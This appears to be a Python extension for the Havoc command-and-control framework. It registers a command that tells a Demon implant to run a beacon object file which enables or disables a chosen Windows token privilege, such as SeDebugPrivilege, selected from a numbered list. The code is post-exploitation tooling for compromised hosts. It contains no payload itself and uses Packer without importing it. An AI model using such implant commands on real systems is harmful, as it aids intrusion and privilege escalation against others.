from havoc import Demon, RegisterCommand

def PrintList():
	list  = "\n";
	list += "Please select a number, to provide as an argument.\n\n";
	list += "1:\tSeCreateTokenPrivilege\n";
	list += "2:\tSeAssignPrimaryTokenPrivilege\n";
	list += "3:\tSeLockMemoryPrivilege\n";
	list += "4:\tSeIncreaseQuotaPrivilege\n";
	list += "5:\tSeUnsolicitedInputPrivilege\n";
	list += "6:\tSeMachineAccountPrivilege\n";
	list += "7:\tSeTcbPrivilege\n";
	list += "8:\tSeSecurityPrivilege\n";
	list += "9:\tSeTakeOwnershipPrivilege\n";
	list += "10:\tSeLoadDriverPrivilege\n";
	list += "11:\tSeSystemProfilePrivilege\n";
	list += "12:\tSeSystemtimePrivilege\n";
	list += "13:\tSeProfileSingleProcessPrivilege\n";
	list += "14:\tSeIncreaseBasePriorityPrivilege\n";
	list += "15:\tSeCreatePagefilePrivilege\n";
	list += "16:\tSeCreatePermanentPrivilege\n";
	list += "17:\tSeBackupPrivilege\n";
	list += "18:\tSeRestorePrivilege\n";
	list += "19:\tSeShutdownPrivilege\n";
	list += "20:\tSeDebugPrivilege\n";
	list += "21:\tSeAuditPrivilege\n";
	list += "22:\tSeSystemEnvironmentPrivilege\n";
	list += "23:\tSeChangeNotifyPrivilege\n";
	list += "24:\tSeRemoteShutdownPrivilege\n";
	list += "25:\tSeUndockPrivilege\n";
	list += "26:\tSeSyncAgentPrivilege\n";
	list += "27:\tSeEnableDelegationPrivilege\n";
	list += "28:\tSeManageVolumePrivilege\n";
	list += "29:\tSeImpersonatePrivilege\n";
	list += "30:\tSeCreateGlobalPrivilege\n";
	list += "31:\tSeTrustedCredManAccessPrivilege\n";
	list += "32:\tSeRelabelPrivilege\n";
	list += "33:\tSeIncreaseWorkingSetPrivilege\n";
	list += "34:\tSeTimeZonePrivilege\n";
	list += "35:\tSeCreateSymbolicLinkPrivilege\n";
	list += "36:\tSeDelegateSessionUserImpersonatePrivilege\n";

	return list;

def TogglePrivs(demonID, *param):
    TaskID: str = None
    demon: Demon = None
    demon = Demon(demonID)
    packer : Packer = Packer()

    if len(param) < 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Not enough arguments {len(param)}")
        return False

    if len(param) > 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Too many arguments")
        return False

    packer.addint(int(param[1]))

    action = "enable"
    if param[0] == "disable":
    	action = "disable"

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to toggle privs.")
    demon.InlineExecute(TaskID, action, "toggle_privileges_bof.x64.o", packer.getbuffer(), False)

    return TaskID

RegisterCommand(TogglePrivs, "", "TogglePrivsBof", "Toggle privileges." + PrintList(), 0, "[ACTION] [PRIV_NUMBER]", "enable/disable 20" )
